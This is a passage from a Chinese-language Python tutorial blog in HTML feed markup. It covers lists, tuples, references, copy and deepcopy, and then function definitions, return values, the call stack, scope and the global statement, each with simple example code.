class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eggs = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">eggs = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(eggs) <span class="comment"># 输出的结果为[4, 5, 6]</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>解释</strong>：这里<code>eggs</code>中的列表值并没有改变，而是整个新的不同的列表值复写了旧的列表值。</p></li><li><p>如果你确实希望修改<code>eggs</code>中原来的列表，让它包含<code>[4， 5， 6]</code>就要这样做。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apple = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line"><span class="keyword">del</span> apple[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">del</span> apple[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">del</span> apple[<span class="number">0</span>]</span><br><span class="line">apple.append(<span class="number">4</span>)</span><br><span class="line">apple.append(<span class="number">5</span>)</span><br><span class="line">apple.append(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(apple)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出的结果为[4, 5, 6]</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：这种情况下<code>eggs</code>最后的列表值与它开始的列表值是一样的，只是这个列表被改变了而不是被复写了。</li></ul></li></ul></li></ul><h3 id="5-2-元组数据类型"><a href="#5-2-元组数据类型" class="headerlink" title="5.2.元组数据类型"></a>5.2.元组数据类型</h3><ul><li><p>除了两个方面元组数据类型几乎与列表数据类型一样：</p><ol><li><p>第一个区别在于，元组输入时使用的括号是<code>( )</code>而不是<code>[ ]</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eggs = (<span class="string">&#x27;hello&#x27;</span>, <span class="number">42</span>, <span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(eggs[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(eggs[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(eggs))</span><br></pre></td></tr></table></figure><p>以下是这串代码的输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br><span class="line">(42, 0.5)</span><br><span class="line">3</span><br></pre></td></tr></table></figure></li><li><p>另一个区别在于，元组像字符串一样是不可变的，元组不能让他的值被修改、添加或删除。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apple = (<span class="string">&#x27;hello&#x27;</span>, <span class="number">42</span>, <span class="number">0.5</span>)</span><br><span class="line">apple[<span class="number">1</span>] = <span class="number">99</span></span><br></pre></td></tr></table></figure><p>例如，输入上面的代码python会报错<code>TypeError</code>。</p></li></ol></li><li><p>如果元组只有一个值，可以在括号内该值的后面跟上一个逗号来表明这种情况，否侧python会认为你只是在一个普通的括号内输入了一个值，逗号告诉python这是一个元组，例如，现在用type函数来看看他们各自的类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>((<span class="string">&#x27;hello&#x27;</span>,))) <span class="comment"># 输出的结果为&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>((<span class="string">&#x27;hello&#x27;</span>))) <span class="comment"># 输出的结果为&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-3-用list-和tuple-函数来转换类型"><a href="#5-3-用list-和tuple-函数来转换类型" class="headerlink" title="5.3.用list()和tuple()函数来转换类型"></a>5.3.用list()和tuple()函数来转换类型</h3><ul><li><p>正如<code>str(42)</code>将返回<code>&#39;42&#39; </code>即整数42的字符串表示形式一样，函数<code>list()</code>和<code>tuple()</code>将传递给它们的值返回成的列表和元组形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="number">5</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>((<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="number">5</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="string">&#x27;hello&#x27;</span>))</span><br></pre></td></tr></table></figure><p>上面代码的输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;cat&#x27;, &#x27;dog&#x27;, 5)</span><br><span class="line">[&#x27;cat&#x27;, &#x27;dog&#x27;, 5]</span><br><span class="line">[&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;]</span><br></pre></td></tr></table></figure></li></ul><h2 id="6-引用"><a href="#6-引用" class="headerlink" title="6.引用"></a>6.引用</h2><ul><li><p>对于变量保存字符串和整数值这种解释其实是简化了python的实际操作，变量的储存其实是对计算机内存位置的引用，这些位置储存了这些值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">cheese = spam</span><br><span class="line">cheese[<span class="number">1</span>] = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"><span class="built_in">print</span>(cheese)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码的输出结果如下</span></span><br><span class="line"><span class="comment"># [0, &#x27;hello&#x27;, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment"># [0, &#x27;hello&#x27;, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：你将一个列表赋给了变量<code>spam</code>，但是在下一行只是将<code>spam</code>变量中的列表引用复制到<code>cheese</code>变量，而不是列表本身。这意味着储存在<code>spam</code>和<code>cheese</code>中的值现在指向了同一个列表，列表的本身实际从未复制，所以当你修改<code>cheese</code>变量的第一个元素的同时，也修改了<code>spam</code>变量所指向的同一个列表。</li></ul></li></ul><h3 id="6-1-标识和id-函数"><a href="#6-1-标识和id-函数" class="headerlink" title="6.1.标识和id()函数"></a>6.1.标识和<code>id()</code>函数</h3><ul><li><p>关于刚刚所提到的关于列表的例子或许有一些难以理解，比如像列表这样的行为为什么不会出现在整数或者字符串这些不可变的值上。其实我们可以通过id()函数来解释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(<span class="string">&#x27;Howdy&#x27;</span>)) <span class="comment"># 输出的结果为2269208642992（每次运行代码内存字节都会不同）</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：当python运行<code>id(&#39;Howdy&#39;)</code>时它将在计算机的内存中创建<code>&#39;Howdy&#39;</code>字符串，返回存储字符串的数字内存地址，python根据当时计算机上空闲的内存字节来选择此地址，每次运行代码，内存字节都会不同。</li></ul></li><li><p>像所有字符串一样，<code>&#39;Howdy&#39;</code>是不可变的，无法更改。如果更改变量中的字符串，就会在内存中的其他位置创建新的字符串对象，并且该变量引用这个新的字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bacon = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(bacon)) <span class="comment"># 输出的结果为2269199734896</span></span><br><span class="line">bacon += <span class="string">&#x27; world!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(bacon)) <span class="comment"># 输出的结果为2269208640560</span></span><br></pre></td></tr></table></figure></li><li><p>可以修改列表，因为他是可变对象。<code>append()</code>方法不会创建新的列表，他更改现有的列表对象，称之为就地修改对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eggs = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(eggs)) <span class="comment"># 输出的结果为2342254802752</span></span><br><span class="line">eggs.append(<span class="string">&#x27;moose&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(eggs)) <span class="comment"># 输出的结果为2342254802752</span></span><br><span class="line">eggs = [<span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;cow&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(eggs)) <span class="comment"># 输出的结果为2342254804352</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：如果两个变量引用同一个列表（如上面所举例的<code>spam</code>和<code>cheese</code>变量），并且列表本身发生了变化，那么这两个变量都会受到影响。<code>append()</code>、<code>extend()</code>、<code>remove()</code>、<code>sort()</code>、<code>reverse()</code>和其他列表方法会就地改变其列表。</li></ul></li></ul><h3 id="6-2-传递引用"><a href="#6-2-传递引用" class="headerlink" title="6.2.传递引用"></a>6.2.传递引用</h3><ul><li><p>要理解参数如何传递给函数，引用就特别重要。当函数被调用时，参数的值被复制给变元。对于列表、字典， 这意味着变元得到的是引用的复制，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">eggs</span>(<span class="params">someParameter</span>):</span><br><span class="line">    someParameter.append(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">spam = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">eggs(spam)</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码的输出结果如下</span></span><br><span class="line"><span class="comment"># [1, 2, 3, &#x27;Hello&#x27;]</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：当<code>eggs()</code>函数被调用时没有使用返回值来为<code>spam</code>变量赋新值，相反他直接就地修改了该列表。尽管<code>spam</code>和<code>someParameter</code>变量包含了不同的引用，但他们都指向相同的列表。</li></ul></li></ul><h3 id="6-3-copy模块的copy-和deepcopy-函数"><a href="#6-3-copy模块的copy-和deepcopy-函数" class="headerlink" title="6.3.copy模块的copy()和deepcopy()函数"></a>6.3.<code>copy</code>模块的<code>copy()</code>和<code>deepcopy()</code>函数</h3><ul><li><p>在处理列表和字典时尽管传递引用是最方便的方法，但是如果函数修改了传入的列表或字典，我们并不希望这些变动影响到原来的字典和列表，此时就可以运用<code>copy()</code>和<code>deepcopy()</code>函数。</p><ol><li><p><code>copy.copy()</code>函数可以用来复制列表或字典这样的可变值，而不只是复制引用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">spam = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(spam)) <span class="comment"># 输出的结果为1773092600256</span></span><br><span class="line"></span><br><span class="line">cheese= copy.copy(spam)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(cheese)) <span class="comment"># 输出的结果为1773092601216</span></span><br><span class="line"></span><br><span class="line">cheese[<span class="number">1</span>] = <span class="number">42</span></span><br><span class="line"><span class="built_in">print</span>(spam) <span class="comment"># 输出的结果为[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(cheese) <span class="comment"># 输出的结果为[&#x27;A&#x27;, 42, &#x27;C&#x27;, &#x27;D&#x27;]</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：现在<code>cheese</code>和<code>spam</code>变量指向独立的列表，这就是为什么将<code>cheese[1]</code>赋值成<code>42</code>时，<code>spam</code>中的列表没有改变。</li></ul></li><li><p>如果要复制的列表中包含了列表，就使用<code>copy.deepcopy()</code>函数来代替，这个函数将同时复制它们内部的列表。</p></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--函数</title>
      <link href="/2025/03/24/Python%E5%AD%A6%E4%B9%A0--%E5%87%BD%E6%95%B0/"/>
      <url>/2025/03/24/Python%E5%AD%A6%E4%B9%A0--%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><blockquote><p>[!NOTE]</p><p>以下内容部分摘录自<code>《Python编程快速上手——让繁琐的工作自动化（第二版）》</code>，并加入了一些自己的理解，仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><h2 id="1-函数定义与调用"><a href="#1-函数定义与调用" class="headerlink" title="1. 函数定义与调用"></a>1. 函数定义与调用</h2><ul><li><p><strong>语法</strong>：使用 <code>def</code> 关键字定义函数。</p></li><li><p><strong>参数</strong>：函数可以接收<code>参数（变元）</code>，<code>参数</code>在函数内部作为局部变量使用。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello, &#x27;</span> + name)</span><br><span class="line"></span><br><span class="line">hello(<span class="string">&#x27;GSY&#x27;</span>)  <span class="comment"># 输出：Hello, GSY</span></span><br><span class="line">hello(<span class="string">&#x27;CYX&#x27;</span>)  <span class="comment"># 输出：Hello, CYX</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>解释</strong>：像<code>print()</code>或者<code> len()</code> 函数括号中经常带有一些值，他们称之为函数的<code>参数</code>，也可以自己定义接收到参数的函数。</p><ul><li>如同上述例子一样：<code>hello函数</code>中有一个名叫<code>name</code>的变元，当函数被调用时，<code>参数</code>就存放在其中（保存在变元中的值，在函数返回后就消失了，例如：<code>在hello(&#39;CYX&#39;)</code>之后再<code>print(name)</code>那么程序就会报错。)</li></ul></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sayHello</span>(<span class="params">abc</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello, &#x27;</span> + abc)</span><br><span class="line">sayHello(<span class="string">&#x27;AI&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>解释</strong>：<code>def sayHello(abc)</code>就是定义了一个这样的函数，而<code>sayHello(&#39;AI&#39;)</code>行则是调用了这样的函数,这样的函数调用也将字符串里的<code>AI</code> 传递给该函数，传递给函数的值称为<code>参数</code>，这里的<code>abc</code>就是接受<code>参数AI </code>的局部变量，也叫做变元。</p></li></ul><h2 id="2-参数与返回值"><a href="#2-参数与返回值" class="headerlink" title="2. 参数与返回值"></a>2. 参数与返回值</h2><ul><li><p><strong>返回值</strong>：使用 <code>return</code> 语句指定函数的返回值。若无 <code>return</code>，默认返回 <code>None</code>。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAnswer</span>(<span class="params">answerNumber</span>):</span><br><span class="line">    <span class="keyword">if</span> answerNumber == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;It is certain&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;It is decidedly so&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Yes&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Replay hazy try again&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Ask again later&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Concentrate and ask again&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;My replay is no&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Outlook not so good&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> answerNumber == <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Very doubtful&#x27;</span></span><br><span class="line">   </span><br><span class="line">r = random.randint(<span class="number">1</span>, <span class="number">9</span>)</span><br><span class="line">fortune = getAnswer(r)</span><br><span class="line"><span class="built_in">print</span>(fortune)  <span class="comment"># 随机输出结果</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>解释</strong>：这是一个随机返回一句话的例子，我们首先定义了一个函数<code>getAnswer()</code>，之后又生成了一个随机变元<code>r</code>它通过<code>random</code>函数在1-9之间随机一个数字，之后再通过对应我们定义函数中对应的部分来返回相应的句子，一般来说函数调用求值的结果称为函数的<code>返回值</code>，用<code>def语句</code>创建函数时可以用<code>return语句</code>指定应该返回什么值，<code>return语句</code>包含 :<ul><li>1.<code>return</code>关键字 </li><li>2.函数应该返回的值或者表达式（如果return语句中是有了表达式那么返回值就是求值的结果）</li></ul></li></ul><h2 id="3-关键字参数与-None-值"><a href="#3-关键字参数与-None-值" class="headerlink" title="3. 关键字参数与 None 值"></a>3. 关键字参数与 None 值</h2><ul><li><p><strong>None 值</strong>：无显式返回值的函数默认返回 <code>None</code>。例如：<code>print()</code>函数,它直接在屏幕上显示文本，但不需要返回任何值，既然所有的函数调用都需要一个返回值，那么它的返回值就是None，而对于所有没有<code>return语句</code>的函数和不带值的<code>return语句</code>他们的返回值都默认是<code>None</code></p></li><li><p><strong>关键字参数</strong>：通过参数名指定值，常用于可选参数。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Hello&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)  <span class="comment"># 输出：Hello World（不换行）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;World&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cats&#x27;</span>, <span class="string">&#x27;dogs&#x27;</span>, <span class="string">&#x27;mice&#x27;</span>, sep=<span class="string">&#x27;,&#x27;</span>)  <span class="comment"># 输出：cats,dogs,mice</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>解释</strong>：上面所展示的就是<code>print()</code>函数的两个可选的变元<code>end</code>和<code>sep</code>：<ul><li><code>sep</code>：指定参数间的分隔符，即：在参数之间输入什么来将他们分隔开（默认空格）。</li><li><code>end</code>：指定末尾字符，即：指定在参数末尾输出什么（默认换行）。</li></ul></li></ul><h2 id="4-调用栈"><a href="#4-调用栈" class="headerlink" title="4. 调用栈"></a>4. 调用栈</h2><ul><li><p><strong>调用栈</strong>：Python 通过栈结构管理函数调用，每次调用函数时创建帧对象，返回时销毁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Alice</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice starts&#x27;</span>)</span><br><span class="line">    Bob()</span><br><span class="line">    Carol()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice returns&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Bob</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob starts&#x27;</span>)</span><br><span class="line">    Carol()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob returns&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Carol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Carol starts&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Carol returns&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Alice()</span><br></pre></td></tr></table></figure></li><li><p><strong>解释</strong>：调用栈是Python记住每个函数调用后在那里返回执行的方式，调用栈不是存储在程序的变量中而是由python在后台处理它，程序调用一个函数时python在调用栈的顶部创建一个<code>帧对象</code>，<code>帧对象</code>保存了再出函数调用的行号，使得python可以记住返回的位置，如果进行了另一个函数的调用python会将另一个<code>帧对象</code>放在调用栈中，且在前一个帧对象之上，当函数调用返回时，python从栈顶部删除一个对象并将执行栈转移至保存在其中的行号。</p><p><strong>注意</strong> ：帧对象始终是从栈顶部添加和删除的。</p></li><li><p><strong>执行流程</strong>：</p><ol><li><code>Alice()</code> 调用 <code>Bob()</code> 和 <code>Carol()</code>。</li><li><code>Bob()</code> 调用 <code>Carol()</code>。</li><li>函数返回时按栈顺序退出。</li></ol></li><li><p><strong>代码输出</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Alice starts</span><br><span class="line">Bob starts</span><br><span class="line">Carol starts</span><br><span class="line">Carol returns</span><br><span class="line">Bob returns</span><br><span class="line">Carol starts</span><br><span class="line">Carol returns</span><br><span class="line">Alice returns</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-作用域"><a href="#5-作用域" class="headerlink" title="5. 作用域"></a>5. 作用域</h2><ul><li><p><strong>全局作用域</strong>：函数外定义的变量，处于全局作用域中的变量称为全局变量。</p></li><li><p><strong>局部作用域</strong>：函数内定义的变量，函数返回后销毁，处于局部作用域中的变量被称为局部变量。</p></li><li><p><strong>规则</strong>：</p><ol><li><p><strong>全局作用域不能访问局部变量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spam</span>():</span><br><span class="line">    eggs = <span class="number">31337</span></span><br><span class="line">spam()</span><br><span class="line"><span class="built_in">print</span>(eggs)</span><br><span class="line"><span class="comment"># 注意：这是错误的代码！！！</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：发生错误是因为<code>eggs</code>变量只属于<code>spam()</code>调用所创建的局部作用域，在程序执行从<code>spam</code>返回后,该局部作用域就被销毁了。</li></ul></li><li><p><strong>不同函数的局部作用域相互独立</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spam</span>():</span><br><span class="line">    eggs = <span class="number">99</span></span><br><span class="line">    bacon()</span><br><span class="line">    <span class="built_in">print</span>(eggs)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bacon</span>():</span><br><span class="line">    ham = <span class="number">101</span></span><br><span class="line">    eggs = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">spam()</span><br><span class="line"><span class="comment"># 这串代码的输出结果为99</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>:这串代码第一个局部作用域来自于<code>spam函数</code>的调用，其中<code>eggs</code>的值为99，然后<code>bacon函数</code>被调用，创建了第二个局部作用域，在新的作用域中<code>ham</code>被赋值为101，<code>eggs</code>赋值为0,当<code>bacon函数</code>返回时，这次调用的局部作用域被销毁，程序执行在<code>spam函数</code>中继续输出<code>eggs</code>的值，所以<code>eggs</code>值为99被输出。</li></ul></li><li><p><strong>局部作用域可读取全局变量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spam</span>():</span><br><span class="line">    <span class="built_in">print</span>(eggs)</span><br><span class="line">eggs = <span class="number">42</span></span><br><span class="line">spam()</span><br><span class="line"><span class="built_in">print</span>(eggs)</span><br></pre></td></tr></table></figure><p><strong>代码输出</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">42</span><br><span class="line">42</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：首先我们调用的<code>spam()</code>中的<code>print(eggs)</code>处于函数<code>spam()</code>的局部作用域中，却可以输出我们在全局作用域中定义的<code>eggs</code>的值，这说明局部作用域可读取全局变量。</li></ul></li><li><p><strong>同名变量在不同作用域互不影响</strong></p></li></ol></li></ul><h2 id="6-global-语句"><a href="#6-global-语句" class="headerlink" title="6. global 语句"></a>6. global 语句</h2><ul><li><p><strong>作用</strong>：在函数内修改全局变量。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eggs = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spam</span>():</span><br><span class="line">    <span class="keyword">global</span> eggs</span><br><span class="line">    eggs = <span class="string">&#x27;spam&#x27;</span>  <span class="comment"># 修改全局变量</span></span><br><span class="line"></span><br><span class="line">spam()</span><br><span class="line"><span class="built_in">print</span>(eggs)  </span><br><span class="line"><span class="comment"># 